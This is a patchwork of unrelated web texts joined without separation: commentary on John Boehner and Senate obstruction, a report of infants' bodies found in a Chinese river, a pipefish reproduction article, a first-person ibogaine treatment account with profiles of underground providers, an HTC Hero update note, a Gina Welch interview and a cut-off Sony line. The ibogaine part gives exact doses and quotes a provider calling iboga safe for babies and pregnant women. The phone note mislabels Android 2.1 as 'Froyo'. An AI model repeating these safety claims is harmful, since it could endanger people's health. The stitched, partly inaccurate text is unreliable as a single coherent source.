“ There are n’t that many places where we can come together , ” House Minority Leader John Boehner of Ohio said on the NBC program “ Meet the Press . ”
Republicans were elected to stand by their principles , and those principles are different than the “ leftist proposals ” offered by President Barack Obama and congressional Democrats , Boehner said . [… ]
“ Leadership is about standing on your principles and opposing those policies that we believe are bad for the country , ” Boehner said .
What ’s wrong with that ?
Absolutely nothing ( except the part about President Obama pushing “ leftist proposals , ” which is a silly assessment ) .
While I did n’t see the exchange , if this report is accurate , Boehner argued that Republicans intend to push their ideas , and oppose the policies they find offensive .
The goal for congressional Republicans is n’t to find “ common ground ” or “ bipartisan solutions ” with those they completely disagree with ; their goal is to fight for what they believe in , opposing the majority ’s agenda .
The remarks should make it pretty clear that Republicans have no interest in working with Democrats on finding solutions to pressing policy challenges .
But here ’s the thing that so often gets lost in the discourse : Republicans are the minority party , which means it ’s their job to oppose the majority ’s agenda .
“ There are n’t that many places where [ the two parties ] can come together ” ?
Well , no , of course not .
Democrats and Republicans perceive reality in entirely different ways , and advocate for wildly different solutions to various problems ( they do n’t even agree on which problems exist ) .
But if Boehner ’s right about this — and I believe he is — then why in the world is it incumbent on the Democratic majority to work with Republicans to find “ bipartisan ” answers to every question ?
If Boehner has no intention of “ coming together ” with Dems in the middle — a reasonable , albeit rigid , position — why must the political establishment maintain the fiction that the governing majority is doing something awful unless they bring the discredited minority on board with every proposal ?
Ron Brownstein noted recently :
We are operating in what amounts to a parliamentary system without majority rule , a formula for futility .
In some respects , it ’s even worse than that .
In nearly all modern democracies , parties that win elections get a shot — they ’re able to do what they want to do , putting their party platform to work .
If the policies are effective and voters are satisfied , the parties are rewarded .
If not , they ’re punished .
The job of the minority party ( or minority parities ) in modern democracies is not to stop the majority from governing .
Indeed , the very idea is practically absurd .
Rather , minority parties consider it their job to criticize the majority , tell the electorate how they ’d be doing things better , and hope voters agree when the next election rolls around .
But we ’re dealing with expectations and procedural tools in the U.S. that are inherently foolish .
We can elect one party to lead , and then give the minority party the ability to stop the majority from leading .
Worse , the political establishment tells voters — and the public agrees — that the majority is doing something intrinsically wrong if they advance policies that the minority disagrees with .
Boehner left no doubt this morning that he and his party do n’t want to work with Democrats on shaping legislation .
That ’s fine .
But with that in mind , can we let go of the ridiculous notion that Democrats are on the wrong track unless Boehner likes their ideas ?
And more importantly , can we abandon the absurd procedures that allow a small minority party to prevent the legislative process from functioning ?
The bodies of 21 babies have been discovered washed ashore along a river in east China and authorities suspect they were dumped there as " medical waste " by local hospitals .
An initial investigation has shown that eight of the 21 babies wore identification tags on their feet tracing them back to a hospital in nearby Shandong province .
The other 13 were unidentified .
State media has reported that three of the eight had originally been admitted to the hospital in a critical condition .
Video footage posted on the website of a local TV station showed the bodies of babies lying on the shore .
The report says some babies were wrapped in plastic bags , at least one of which had " medical waste " written on it .
Some reports say the bodies could have been those of aborted foetuses or babies who had died of illness .
The Xinhua news agency says the bodies have been cremated .
It says the babies ' families had paid two hospital mortuary workers to dispose of the bodies but they instead dumped them in the river .
The workers have been detained .

Who ’s the daddy ?
If we ’re talking about Gulf pipefishes , it ’s easy to spot : he ’s the pregnant one .
Males and females across the animal world have always attempted to foist responsibility for caring for their offspring onto each other .
In pipefishes , seahorses and sea dragons , the females seem to have won : the males get pregnant and carry the offspring as they develop .
But the males are no evolutionary pushovers .
They may be left holding the babies , but they assert themselves by selectively aborting offspring from less attractive females .
Sex back to front
Pipefish reverse every stereotype we have about the roles of the sexes .
In species where the females get pregnant or otherwise care for the offspring , the males tend to be more promiscuous and the females more choosy over who they mate with .
Pipefish do things the other way round : in Gulf pipefish , males mate once per pregnancy while the females mate with several males .
As a result , females compete more for the males ’ attention .
The females are also larger than the males , and have conspicuous V - shaped silvery stripes that may make them more attractive to the opposite sex .
It is also the female that initiates courtship : she erects her dorsal fin , darkens the skin around the silvery stripes , and holds her body in an S - shape .
Just to make the point , she sticks out her ovipositor , the organ with which she lays eggs .
Then both the male and the female swim with their long thin bodies held vertically .
If the fussy male is willing , they intertwine their bodies and the female “ ejaculates ” her eggs into a pouch on his chest .
Within this protective cocoon , the male fertilises the eggs then nurtures the young as they develop .
The pouch has a structure rather like the placenta found in female mammals , which allows the father to transfer nutrients to his offspring .
You always loved him more
But it seems these parents are guilty of favouritism .
Kimberly Paczolt and Adam Jones of Texas A&M University in College Station have shown that the males are selective at all stages of the breeding process , including after they have become pregnant .
For starters , they are picky about which females they mate with , preferring to go for big ones .
Paczolt found that males would generally mate with the largest females within a day of encountering them , but would um and ah for weeks before bestowing their favours on a smaller suitor .
That ’s not just sizeism : larger females provided more eggs .
A higher percentage of those eggs made it to birth , too , though that could be in part because the fathers took better care of their large mates ’ offspring : when they had just had a brood with a large female , fewer offspring would survive from the next one .
In other words , the males seem to be selecting which broods they lavish the most care on .
The unlucky offspring that the males are n’t bothered about are more likely to die before birth .
Paczolt does not know how the males help their favoured offspring to thrive .
But another recent study raises an intriguing possibility .
Pregnant males of the closely related broad - nosed pipefish can drain nutrients from their offspring through the brood pouch – nutrients that were originally included in the eggs .
The “ placenta ” that the males use to nourish their young can also be used to take food off them – talk about stealing candy from a baby .

A traditional Bwiti medicine ceremony at Iboga Life in NYC
This is the second of a two - part series .
Go here if you missed part one .
Before Clare gives me the ibogaine she has me write out my intention for my journey , what I hope to get from the experience , and whatever questions I may want to ask the iboga spirits .
She takes my intention and places it on a small altar she has built with candles and feathers .
She runs my body over with burning sage and then spreads the smoke around the room , clearing spiritual energy and opening up the space for the iboga spirits to enter and do their work .
She has me lie down on the bed .
Next to me on the pillow are a set of headphones hooked up to an ipod , and a special kind of visor allegedly designed by Alex Grey that improves psychedelic visions .
Clare takes my hand into hers .
 As part of the treatment plan here , I make a life contract with all of my clients .
Sometimes the medicine will open a door to the other side and it will tell you you can go into it if you want .
I make my clients promise me theyll stay here in this life .
They came here to live , and that s exactly what they re going to do .
I know you re not in that place , but I gotta say it anyway .
Who knows what you may want to do once you re up there . 
 No problem ,  I laugh ,  Ive got a lot to live for ,  and was warmed by the truth of it .
It was the perfect last thought before I began .
 Good ,  she replied .
 Here s your test dose to get things started . 
She hands me two large yellow and green capsules containing an 85 % pure mixture of ibogaine hydrochloride and alkaloid extract ,
In total I would be administered 1.42 grams in three doses between 11:15 pm and 2:15 am for a 17mg / kg overall dose , substantial for iboga .
Clare puts on some ethereal music with elegant and comforting female voices and then turns off the lights in the room and leaves Joaquin , Jeff and I in candlelight to await the onset .
The first sign that ibogaine is working is generally a loud buzzing or ringing in the ears , which for me begins within the hour .
Soon after that I begin to feel warm and things take on a light golden glow .
I begin to see tracers following any movement , and it grows increasingly difficult to focus my eyes on anything .
Thats when I decide its time to put on the visor and headphones and settle into the journey .
The shift to inner space almost immediately kickstarts a visionary phase .
The blackness that is enveloping me suddenly forms depth and texture , morphing into a paisley - like tapestry that floats backwards , forming a three dimensional space that looks like I can reach out and touch it .
The tapestry floats up and to the right , and then sails away out of my vision like the magic carpet of Aladdin .
This pantomime , repeated over and over , would become the transitional metaphor for each new vision I would have as the journey unfolded , as if the floating tapestry was the stage curtain between acts of a play , or the title card between scenes of a film .
I begin to see kaleidoscopic fireworks , bursts of color and light , geometric patterns casting across the inner transom .
They look almost like neurons and synapses firing , like molecules passing back and forth , valent energies interweaving .
Then they begin to take on more animation and I sense have an intuitive understanding that the lights and patterns each have individual consciousness , that they are alive .
When Clare returns with my second dose , I remove the visor and see elongated grey spirits resembling the paint splotches of Jackson Pollack rapidly circling the room behind Clares head .
Floating suspended in the same space are glowing blue orbs like energetic jellyfish .
The spirits would plow through the blue orbs , separating them into droplets like oil in water .
Just outside the sliding glass doors on either side of the room are pools of spirits and blue energy that cannot enter my room .
In the background , massive spirit shapes bigger than city buses pass by .
I relate this information to Clare , pointing out where I am seeing the shapes .
She smiles and nods , knowingly .
 They are busy ,  she says .
 Not all of them have time to stop in . 
Clare changes the music and puts on a compilation of traditional African tribal music that has beautiful , acrobatic vocalizations and harmonies mixed in with powerful sounds of nature : water flowing , thunderclaps and lightning , fire , rain and wind .
This begins a new phase of the journey that is not visual , but rather , emotional .
I understand the stories behind the songs , not through the words , but though the emotions in the words , the tones , timbre , and energy of the voices .
I feel the loss of death , the joy of love , the fear of displacement and hatred , the love of the land , the cries of freedom .
This is our land , this is our medicine , these are our spirits , we welcome you , do you welcome us ?
What have you to offer ?
Then the tapestries return , but instead of flying away they fold back to form what looks to me like a space under my blanket , like a bed fort a child would build with pillows and a flashlight .
This bed fort ,  however , has the feel of an opium den , with Persian rugs and glowing lamps .
It was about then I realize that I no longer have any fear about the journey , that I feel comfortable and right .
I am eager to go deeper , to see more .
I want to see what my vast and uncharted shadow has in store for me .
I feel confident I can handle anything now .
Almost as if it was waiting for me to think that , a voice says , not vast and uncharted !
Known !
Another vision begins .
Before me are caricatures of myself , jerky low - res avatars like in a video game or graffiti art .
These caricatures communicate various aspects of my personality to me , not through words or even scenes , but through symbolic movements , repetitive motions somewhat similar to the tape loops  others have described , but significantly more symbolic in nature .
In this loop , I / the caricature of me begins with my hands folded together in prayer , and I am still .
Perpendicular to me is a long row of what looks like giant playing cards as tall as me .
Like any deck of cards , there are number cards and face cards , except the face cards are people in my life , and the number cards represent situations , consequences and outcomes . 
From the praying position I then suddenly flail my arms backward and shake my head .
Each time I do this I knock down these cards like a row of dominoes .
They race around in a big loop until they come back full circle and knock me over .
The message is clear to me the entire time .
This scene represents the ongoing ebb and flow between my ego self and my higher self .
When I am in the praying position , it symbolizes the times when I am coming from a place of humility and grounding , and as such , nothing is disturbed .
Each time I flail my arms wildly it represents me falling back into ego , and invariably starting a chain reaction , symbolized by the cards falling over like dominoes , which eventually come back to bite me in the ass .
It was such a painfully simple representation of one of the hardest personal lessons of my life , and yet , as I m watching it , a voice says , you know this …youve known this for a while , your only challenge is to be vigilant and remember it .
I kept expecting this stern , paternalistic , tough - love , brutal assault on my character .
What I got was kind frankness instead .
You were afraid that you would come in here and see painful things about yourself that you werent ready to handle , but youve already done all that work , and you didnt need us to do it .
You know yourself , because you took the time to get to know yourself , honestly and critically , because you didnt want anymore pain .
You wanted us to show you how to be a better man , and yet , you already know .
The question is , will you BE that man ?
Youve got everything you ever asked for .
You are lucky and loved and can speak to many .
How will you honor this every day ?
Will you help those who need it , who suffered as you once suffered ?
How will you remind yourself that its not about you , that you are just a messenger ?
Go enjoy what you have built , but always remember to spread that love and fortune , and always be kind to yourself .
The true believers will tell you that the iboga spirits are speaking to us every day through messengers and mediums , signs and symbols , and all we need do is seek and we shall find .
As if to reinforce this from beyond the grave , the distinctive voice of Howard Lotsof ( he was missing many teeth ) periodically comes through the headphones in short clips that Clare had interspersed on the playlist .
The plants are alive and their speaking to us all the time , we just need to find a way to listen to them .
That s good medicine !
I describe all of this to Clare when she returns for the last time before my session officially ends .
She is flummoxed by my ability to coherently describe the depth and breadth of my visions .
 You are the single most coherent person I have ever witnessed on ibogaine .
Most people cant speak or think clearly for a couple days , much less move around . 
When I tell her I am hungry too , she looks at me like I am from Mars .
Aside from some ataxia ( a loss of balance and motor control ) , which causes me to crack my forehead on some marble in the bathroom , I feel great , but worn out .
Unfortunately , I will not be able to sleep until the following night , and I cant focus my vision for a whole day .
I would still be seeing trailers and auras a week later .
Removing me from the pulse / ox monitor , Clare tells me shes been in constant contact with my partner in San Francisco , who also works with plant medicine , giving her updates on my session .
This tiny personal gesture touches me deeply , and reveals so much about Clares true nature : evangelistically inquisitive and inclusive .
I feel much gratitude , which is what I tell Clare when she asks me how I m doing .
 I get it , now  I say .
 Remarkable plant .
And you guys are incredible at what you do . 
She laughs .
 Good .
And to think that weve been called a back - alley abortion ibogaine clinic . 
 What ? 
 Oh you havent heard that ?
Hmpf . Deborah Mash said that .
 Deborah Mash ?
Really ?
 You know Deborah Mash ? 
 I know of her ,  I say , and cant believe she would say such a thing .
The Academic
 Absolutely I said that ,  Dr. Deborah Mash tells me when I contact her at the University of Miami .
 I think that addicts deserve the best .
I couldnt live with myself if I ever hurt someone .
I didnt take this cause forward to put others in harms way . 
Mash is one of my heroes .
Back in the Nineties she discovered coca-ethylene , a chemical that is formed in the human body by the liver when both cocaine and alcohol are ingested .
Coca - ethylene is longer acting , more potent , and substantially more addictive then cocaine itself .
I can tell you first hand about that one .
No matter how hard I tried to quit , alcohol always led to a relapse , and her discovery helped me realize that to quit cocaine , and to stay quit , I had to stop drinking for a while too .
One of the world ’s foremost scientific experts on ibogaine , Mash also identified the active metabolite , noribogaine , that is credited with the ability to detoxify and sustain a newly recovering addict ( for the record , she says noribogaine is a misnomer and that the metabolite should be called  decmethylibogaine ) .
Mash also opened an off - shore healing center on the Caribbean Island of St. Kitts , which she used for research and development , gathering data on over 286 ibogaine treatments .
 This was the only study conducted to my knowledge that had qualified professionals associated with it ,  she adds .
This not - so - subtle dig at the underground begins to touch on where Mash and the rest part ways .
As ibogaine was forced underground , Mashs biggest concern became lay - providers and activist types , like Polanco , Dana Beal , Eric Taub , Mark Emery , and , of course , Howard Lotsof , who administer treatments in what she considers to be unsafe conditions .
 What you have got are people who do n’t know what they re doing .
They think they do , but they dont .
And things can go wrong .
Very , very wrong .
People have died in their care .
I take that very seriously . 
Mash is coming from a very different place than the addicts and the ibogistas .
She believes that addiction is a neurological disorder in the same way as Alzheimer ’s and Parkinson ’s or cancer or diabetes , and that addiction needs to be corrected medically .
More importantly , addicts need to be viewed with the same compassion as people suffering from any of those other illnesses .
 It s in their genes , it s not their fault .
They couldnt help getting sick , they re not morally defective .
We first have to humanize them .
These are sick people ! she says .
Here you start to see what really makes Mash tick .
Despite her gruff manner and her corrosive distrust of the underground , she really cares about curing addiction .
Addicts arent lab rats to her , they re suffering people .
Shes a doctor .
You do the math .
 I would love to be able to give young addicts an ibogaine dose and then stick them in treatment .
As an adjutant to treatment , its perfect , but its not the treatment itself .
Think about if we could help just a third of the people addicted to drugs , wouldnt that be absolutely amazing ?
Well , we had a chance once , and we blew it . 
Mash has certainly made her fair share of enemies in the ibogaine underground .
If the back - alley abortion comments didnt exactly ingratiate her to her colleagues , her relationship with Howard Lotsof is what sealed the deal .
Lotsof is beloved by this community , a sacred cow , yet Mash believes , ironically enough , that hes the one ultimately responsible for ibogaine never going mainstream .
Back in the mid Nineties when she first discovered noribogaine , Mash claims she offered Lotsof , who held the legal patents , a 50/50 partnership to move forward with research and get a study funded by the National Institute for Drug Abuse ( NIDA ) .
This could have led to FDA approval of the drug and a pharmaceutical contract , which could have reaped billions .
Lotsof refused the offer and in turn sicked his lawyers on Mash to prevent her from , as she puts it , taking away his baby . 
Lotsof then cut off her access to ibogaine , a move which she took personally .
 Howard shot an arrow into the heart of the only scientific team to ever get behind him ,  she says , the pain and frustration still evident in her voice .
The net result was that NIDA refused to fund a formal study , Mashs research was forced off - shore , and they did not get the millions in R & D money that it takes to get a drug to market before Lotsofs patents expired in 2003 .
Eventually , their feud spilled over into the underground , and would end up polarizing along ideological lines .
 We were trying to get the medical community on board , and instead , we got totally derailed ,  Mash laments .
 The medical community wasnt too crazy about the psychedelic aspects of ibogaine , and I felt ( and still feel ) that the data supports that we can isolate that part of the drug and have the metabolite without the psychotropic effects .
Crazy left - wing Howard and his buddies didnt go for that .
She says that the obsession  the underground has with the visionary aspect of the drug is at the expense of all those people they could be helping .
She still believes , however , in the potential of iboga - related metabolites to revolutionize the field of addiction treatment , even if shes given up hope on ibogaine itself .
The problem , she points out , is the hundreds of millions of dollars it takes to develop a new drug .
 Whos going to pay for that ?
Dana Beal ?
Eric Taub ?
Marc Emery ?
The Activists
Unfortunately , as far as public relations goes , the underground hasnt done itself any favors , that s for sure .
The most visible leaders of the movement are mired in public controversy involving drug allegations .
Howard Lotsof ends up being the cleanest of the lot .
These include Polanco , Beal , Taub , and Emery .
Dana Beal is a suspected marijuana trafficker who was busted twice between June of 2008 and September of 2009 .
He is currently free on $ 500,000 bond facing a case in Nebraska in which he was caught with 150 pounds of weed , shortly after pleading guilty to a misdemeanor in an Illinois case in which he was caught with $ 150,000 in suspected drug money .
Eric
Taub is considered , along with Lotsof and Mash , to be one of the three main luminaries of the ibogaine movement .
He is also what Deborah Mash calls the prototypical dangerous evangelizing lay - provider . 
Taub has come under fire for allegedly running laissez - faire clinics in places like Costa Rica and Italy , and even more so for setting up a mail - order business so that anyone who wants to obtain iboga can .
Hes also got something of a god complex , according to sources close to him who prefer to remain anonymous .
And then of course theres Marc Emery , the Canadian marijuana activist / entrepreneur who was arrested in 2005 for  Conspiracy to Distribute Marijuana and Seeds in a controversial cross - border raid by the D.E.A. who used the Vancouver police to do their dirty work .
Emerys defiant stance , and the widely held public view that he has committed no crime and is the target of harassment , has earned him folk hero status and the nickname ,  The Prince of Pot . 
In 2002 Emery opened the Iboga Therapy House outside Vancouver and for the next three years funded dozens of free treatments for addicts and those seeking psycho- spiritual therapy . 
When he was arrested in 2005 he handed over ownership of the house to a not - for - profit organization , and longtime therapist Sandra Karpetas assumed much of the day - to - day operations .
Karpetas , who along with Valerie Mojieko is responsible for initiatiing the MAPS study which began in Canada , is another autodidact with no formal training in addiction like Clare Wilkins , except Karpetas was turned on to ibogaine by Marc Emery for purely initiatory purposes ,  she says .
Karpetas used a grant from the Womens Entheongen Fund , an offshoot of the Womans Visionary Congress , to reopen the Iboga Therapy House .
She went on to treat 65 patients between 2006 and 2008 before financial constraints forced her to close it down .
She is just now preparing to reopen , with 700 people on her waiting list , and a renewed focus on getting a formal study funded through Health Canada , the Canadian health care system .
 Here in Canada we consider treatment  a much longer focused program , so we define ibogaine use as therapy ,  because its mostly a detox program .
We dont call iboga medicine or a drug or psychedelic .
We want to legitimize it here as a natural health product , an herbal detoxification program .
Its an important distinction we make . 
Karpetas relates how everyone who has had the iboga experience now feels that they are part of an amazing global phenomenon , a movement of compassion , of one helping another .
 The plants are urging us on .
They are incredibly evolved life forms .
Look at the genome of a human compared to that of a simple plant , and the plant wins .
There is more to life than meets the eye , they are telling us . 
The Shaman
When I finally speak to him on the phone , after connecting on Facebook , Dimitri Mobengo Mugianis tells me hes in a hotel room in New Jersey on day three of detoxing a young male heroin addict .
Dimitri is part of the neotribal wing of the ibogaine underground .
Hes whats known as a ritual / spiritual provider  who administers iboga in its traditional root bark form in a Bwiti ritual .
His New York City based company , Iboga Life , conducts traditional Bwiti medicine ceremonies , mostly for addicts , although , there are psycho-spiritual clients .
Hes no dilettante ; this is a cat whos been around .
He has undergone several Bwiti iboga initiations in Gabon , and now refers to himself euphemistically as a member of  Bwiti USA .
Hes also the cofounder of the New York City Drug Users Union , and the subject of a new documentary called  Im Dangerous with Love ,  by acclaimed filmmaker Michel Negroponte , director of Methadonia .
The point is that this man understands addiction .
He has a serious , no bullshit New York frankness to him .
 My role as a Bwiti is to detox junkies .
That s what I do .
And junkies are very spiritual people and they re looking for this kind of thing .
What were lacking is community and ceremony and a rite of passage , a way to frame our lives .
Bwiti is a system of plant medicine where people can find healing and purpose .
In particular , it offers a way to help men reclaim their manhood . 
Dimitri argues that addicts and indigenous peoples have a common bond because they are both dislocated and disenfranchised , two of the last social groups where it is still acceptable to portray them with vicious stereotypes .
 Colonization and addiction are about infantilization , desexualization , dehumanization , imprisonment , enslavement , and expropriation , whether its land , family , your body or your will .
We help people reclaim all of it . 
I ask him if he thinks the treatment will ever go above ground .
 Heres where I separate myself from most of the iboga community .
Most want this to be a pharmaceutical drug administered in hospitals , right ?
But prescription , by definition , is not about access , its about limiting access . 
But what about safety ?
What about the people who have died ?
 I dont give a fuck about that shit .
Iboga has been around for 3900 years !
It s fucking safe .
Ive seen babies eat it , I ’ve seen pregnant and breastfeeding woman eat it , dogs , old people , you name it .
The shit is safe !
And if we can eat a natural bark or drink a vine that cures our illness , we wont need the goddam people in the white coats anymore .
If we could drop the price and train thousands of lay providers , than weve really got something going on . 
His strategy , and critique , is simple .
The psychedelic medicine community , the entheogen movement ,  as he calls it , is almost exclusively made up of upper middle class , white male academics .
But the medicine comes from poor people in Africa , and yet it is unknown to poor people in America , particularly African - Americans .
This focus on this racial and economic aspects of iboga has made Dimitri  the red headed stepchild of the movement . 
 Ibogaine gives us a real chance to bridge that socioeconomic gap , but the medical establishment is afraid of who we are and the people we are bringing in .
So , really , this is the most revolutionary aspect of this movement .
It s turning on the Puerto Rican gang banger who would otherwise never have taken this stuff that really inspires me .
I wanna make that happen . 
Dimitri has deep love for Howard Lotsof , calling him my father .
He tells me how Howard wanted to go into the African - American community and throw open the doors to ibogaine for them , but the reception was not what he expected .
 In the beginning we would stand out on 125th street in front of the methadone clinics handing out fliers .
You can probably guess hardly anyone responded .
But slowly those folks are starting to come to us .
Yeah … theyll get there .
He laughs and clears his throat , and then settles on a final thought .
 Look , we dont need to be here to help people .
We just need to be here for people who want to help themselves .
How we do that is we meet them where they are at . 
It s all part of the vision
You hear those words uttered by nearly everyone iboga has touched , we meet them where they are at .
It s the mantra of this remarkable collection of passionate , difficult people who come from the perspective that the addicts are the real healers and iboga is merely the catalyst , the inspiration .
It s here , in the humanization , and in many respects , elevation of these former scourges of society that we see the real revolution , and why the medical establishment is simply not interested in ibogaine .
The undergrounds existence is a natural consequence of that repudiation .
Theres a philosophy known as  Dual - Power Strategy  that espouses the creation of alternative institutions that embody the beliefs and practices of breakaway , sub - or countercultures , a sort of positive antidote to trying to change a system from inside that is hopelessly ineffective and corrupt .
The fundamental idea is to channel transformative energy not into changing existing institutions but rather into building viable alternatives .
As these alternative structures grow , like the cooperative movements in Argentina , eventually they take on more and more of the functions of a larger social system .
Eventually they grow into an alternative infrastructure that fulfills economic , political , social , and cultural needs , like we have seen develop in Americas evangelical community .
This is precisely what we see happening with alternative medicine , whether its the burgeoning natural health industry , the integration of eastern medicine , organic nutrition , addiction , or even the movement against vaccines , the response to the Western model of medicine has been profound .
It is not surprising then that this alternative philosophy is attractive to those in the exile nation  who feel oppressed , disempowered or disenfranchised within the greater society .
Addicts inhabit ground zero of this realm .
So if an addict can be treated with respect , have their spiritual pain acknowledged , and feel the support of people around them who do not judge them , then they not only have a chance at healing themselves , but also bringing that healing to others .
The ripple effect could change the world .
This became clear in the weeks following my experience with ibogaine , when I realized that now I too was part of this revolutionary underground .
People who followed along on my Facebook and Twitter pages began contacting me .
One friend told me just he returned from a traditional Bwiti initiation ritual in Costa Rica .
Most people told me about their friends , brothers cousins , mothers , who were addicted to heroin , nicotine , crack , meth , K , alcohol .
They need help , they didnt know what else to do , theyve run out of options , should they try ibogaine ?
It becomes abundantly clear that there will never be a shortage of people wanting it , so does it really matter whether this medicine is ever sanctioned by the medical establishment ?
It s clear already that people who need it will find it anyway , when theyve had enough .
I spoke with Clare over Skype a few weeks later to check some facts .
I had asked her to give me more information on the short recordings of Howard that she had interspersed on the playlist she set up for my journey .
 I went through fifty gigabytes of music and I have no recordings of Howard Lotsof talking about iboga .
It sounds like it was part of your vision . 
 That s impossible ,  I replied .
I know what I heard . 
I was dumbfounded .
She could see it in my face .
But she smiled , and I thought I saw a tear form , but it could have been the light reflecting off her glasses .
 Looks like Howard made it after all ,  I said .

The HTC Hero is set to get an Android 2.1 firmware update 16 April , after it was announced a worldwide update for the handset was on the cards .
The update ( codenamed Froyo ) mean that the phone will match the recently released HTC Legend and soon to be released Desire for firmware .
Although the worldwide rollout is to start as early as 2 April , UK HTC Hero users – who have Orange and T - Mobile contracts – wo n't see the firmware until 16 April at the earliest .
If you are a 3 user , then you will have to wait another week , as your update is n't coming till 22 April .
New features
Key features for Android 2.1 include the use of multiple email accounts on a device , Quick Contacts feature and Exchange support .
Things like the camera , messaging and virtual keyboard are also improved .
As is the browser – now with support for HTML 5 – and Calendar .
While the update is good news for HTC Hero users , it does give the more expensive Legend one less feature to differentiate itself from the handset – something that may well impact in sales .

In 2005 Gina Welch , a young graduate student and atheist from Berkeley , in an effort to better understand the phenomenon of Christian evangelicalism , decided to join Jerry Falwell ’s Thomas Road Baptist Church .
She spent two years as part of the church community , culminating in a missionary trip to Alaska .
Metropolitan Books has just published her account of the experience , In the Land of Believers : An Outsider ’s Extraordinary Journey Into the Heart of the Evangelical Church .
I spoke with Welch recently via telephone .
*
How did you come to join Jerry Falwell ’s church ?
I had been living in Charlottesville , Virginia , after I ’d gone to graduate school .
I noticed that there were all these Christians around , and I was very uncomfortable with them .
Meanwhile , what was going on nationally was the perception that evangelical Christians were taking over the country , that they had their fingers in government .
I was n’t able to reconcile the media perception of evangelical Christians — that they were very militant , that they were brainwashed — with the perception I had of evangelicals personally .
I wanted the challenge of understanding people whose views on most issues were very different from mine .
I truly did n’t believe that I would get to a point where I could relate to them .
What did you like most and least about Falwell ’s Church ?
There is one main characteristic that I appreciate : selflessness .
One of Jerry Falwell ’s mantras was “ Jesus First , ” which has always been a difficult line for me to parse .
For a lot of church members I knew , their desires are secondary .
They ’re primarily on earth to be servants .
That has a lot of a great side - effects , like individual humility and a willingness to help .
The negative side effect of that humility , though , is a real resistance to being critical of institutions to which they subscribe .
It ’s a problem of buying the party line without critical analysis .
It can be a kind of intellectual surrender .
There was one night when we had an Easter dinner at Thomas Road and a pastor was urging Church members to give financial gifts in addition to the 10 % tithe .
He said , “ Some of you may wonder what Jerry Falwell is doing with my money , ” as if addressing the concerns of anyone who might think that they were being ripped off .
But he continued , “ It does n’t matter if Jerry Falwell abuses your gifts , because God sees your offering , and he ’ll reward it in heaven . ”
It ’s not for you to criticize .
That ’s a problem .
There are two other works that deal similarly with Falwell ’s church : The Unlikely Disciple by Kevin Roose , and The Book of Jerry Falwell by Susan Friend Harding .
How do you see your book in relation to them ?
Both of these are wonderful .
Harding ’s book , which I read while undercover , focuses on the specific vernacular of Falwell ’s church , the coded way evangelical Christians at Thomas Road express their feelings to one another , and what dynamics those linguistic idiosyncrasies reflect in the culture .
So , for example , while you or I might say , “ I want to take a trip to my sister ’s house this summer , ” someone at Thomas Road might begin the same sentence , “ God ’s putting it on my heart that … ” which keeps the believer ’s will secondary to God’s .
Kevin Roose , uncannily , was undercover at Liberty University for part of the time I was undercover at Thomas Road , so our books complement one another pretty beautifully .
He and I both share a kind of outsider ’s perspective — neither of us is evangelical and we ’re both progressive — and we both , remarkably , ended up with books suffused with a sympathetic animus : we found things to love .
Roose ’s book differs from mine in that it ’s essentially a study of evangelical college life — of young people developing friendships , ideas , and identity — while mine deals with adult evangelicals processing the messy , unpredictable world around them .
The fear of sin courses throughout the book .
There is a scene in Alaska where your group gets children to read the Sinner ’s Prayer .
It brings to mind Thomas Paine ’s observation about the capacity of religion to shock the mind of a child .
The thing that disturbed me about the way we were presenting the Christian message to children is that it was geared toward getting them afraid of going to hell .
But I do think that there is genuine urgency to get children to say the Sinner ’s Prayer because their parents are frightened for them .
It ’s not just about trying to indoctrinate them , but , I think , it ’s a genuine concern for their eternal fate .
You came to sympathize with these people , and your portrayal humanizes them .
Yet they have been the base for a political movement that would deny that humanity to others — gay men and women , woman needing to terminate pregnancies , non-Christians etc .
At what point does it matter if people are good to those in their group if their group overall is not fostering a greater good ?
Secular progressives need to know that they ’re not dealing with insensitive people who lack empathy .
Because the division between conservative Christians and secular progressives is so complete , because there ’s no conversation , there is a tendency for people from my camp to view conservative Christians as self - interested , and I mean to chip away at that perception .
Does it excuse homophobia ?
Does it excuse their opposition to reproductive rights ?
No .
But my hope for the book is to start conversation between conservative Christians and secular progressives .
Part of the reason that conservative Christians are so reactionary about gay rights is that there just are n’t a lot of gay people in their communities .
I think it ’s ignorance .
Is it just ignorance ?
Would n’t someone who was gay in that environment likely be sent for reprogramming or driven out ?
This is exactly my point : their ignorance stems from the fact that conservative Christian communities are very hard places for gay people to carve out an existence .
I knew of one Liberty University staffer who was outed by coworkers , and subsequently moved to the West Coast .
A girl I knew said of him , “ If that was me , I ’d move to California , too . ”
Of course this means that there ’s a real diversity - vacuum in conservative communities when it comes to sexual orientation , so perceptions of homosexuality are built on myth , and misconceptions go unchallenged .
How do we become sympathetic toward people we ’re inclined to judge ?
We get to know them , we learn to relate to them as flesh and bone human beings .
Mel White , a former ghostwriter for Jerry Falwell and Pat Robertson who came out of the closet and became an advocate for gay rights , stayed in Lynchburg with his partner and kept attending Falwell ’s church , kept speaking about the reconcilability of his faith and sexual orientation .
In White ’s position , would I have the strength to fight the same fight , make the same sacrifices , and stay in a community so hostile to me ?
Probably not .
But I believe he ’s doing the only thing that will work : teaching by exposure .
If we ’re waiting on the cultural zeitgeist to bring conservatives around on gay rights , I think we ’d better get comfortable ; we ’re in for a long wait .
I ’m less interested in assigning blame than I am in figuring out how to build progressive influence in conservative communities .
I do n’t think it ’s a lost cause .
Do you see that conversation beginning to develop anywhere now ?
Comment conversations on mainstream media articles and blogs can help secular progressives and evangelicals hash out differences .
I ’ve had some great experiences interacting with people of faith who post comments on my own blog .
The trouble is that anonymously kicking a brief comment up on the Internet is n’t a substitute for real - world human interaction , and in fact the blindness of the interaction has a lot of potential for overstatement and miscommunication .
Maybe we could start a cruise line for this purpose , so everyone would be well - fed , tanned , and relaxed before sitting down to summit .
Call it Middle Ground of the Seas .
Has there been any fallout from Thomas Road upon learning of your book ?
Not yet .
In the epilogue , I describe how I had a very moving , positive experience revealing what I ’d done .
Since then I ’ve kept in touch with several of the people I knew at church .
I sent them a couple of copies of the book , and I have n’t heard about their reaction to it .
It ’s hard for me to know how it will read for them .
I know it ’s not a love letter , but I tried to be sensitive and fair .
I do n’t know what it would feel like to be written about , to have my life recorded without my knowledge , and to have my most deeply - held beliefs represented by someone who did n’t agree with them .
I hope that they think it ’s fair .
I hope they appreciate it , but whether they do is ultimately out of my control .
We already know that Sony Pictures Entertainment chairman / CEO Michael Lynton , himself rail thin , keeps “ cutting the fat ” at Sony by laying off hundreds of staff who are integral to the studio ’s operation .
